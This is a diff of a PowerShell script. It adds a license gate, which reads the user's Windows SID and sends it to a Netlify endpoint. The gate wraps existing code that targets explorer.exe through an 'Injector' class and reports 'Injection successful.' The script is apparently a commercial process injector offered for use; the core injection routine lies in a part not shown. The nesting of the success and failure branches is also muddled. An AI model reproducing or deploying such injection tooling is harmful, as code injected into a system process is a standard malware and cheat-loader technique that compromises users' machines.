@@ -1,3 +1,33 @@
+# Force TLS 1.2 (required for Netlify HTTPS)
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# Step 1: Get current user's SID
+try {
+    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+    $sid = $user.User.Value
+    Write-Host "[-] Your SID: $sid"
+} catch {
+    Write-Host "[x] Failed to retrieve SID"
+    exit
+}
+
+# Step 2: Call your Netlify API
+$apiUrl = "https://orphues2apix.netlify.app/.netlify/functions/checkSid?sid=$sid"
+
+try {
+    $response = Invoke-RestMethod -Uri $apiUrl -Method Get
+} catch {
+    Write-Host "[x] Network Error: $_"
+    exit
+}
+
+# Step 3: Check response
+if ($response.success -eq $true) {
+    Write-Host "[+] License Verified: $($response.message)"
+    Write-Host "[+] License Key: $($response.key)"
+
+    # Step 4: Injection logic placeholder
+    Write-Host "[*] Proceeding with injection..."
 # Find explorer.exe process
 $proc = Get-Process explorer -ErrorAction Stop | Select-Object -First 1
 $targetPID = $proc.Id  # Use different variable name
@@ -67,4 +97,11 @@ Write-Host "Injection successful."
 
 if ($hProc -ne [IntPtr]::Zero) {
     [Injector]::CloseHandle($hProc) | Out-Null
+}
+
+
+} else {
+    Write-Host "[x] License Check Failed: $($response.message)"
+    Write-Host "[*] You can retry or contact support."
+    # Do not exit here; script continues
 }
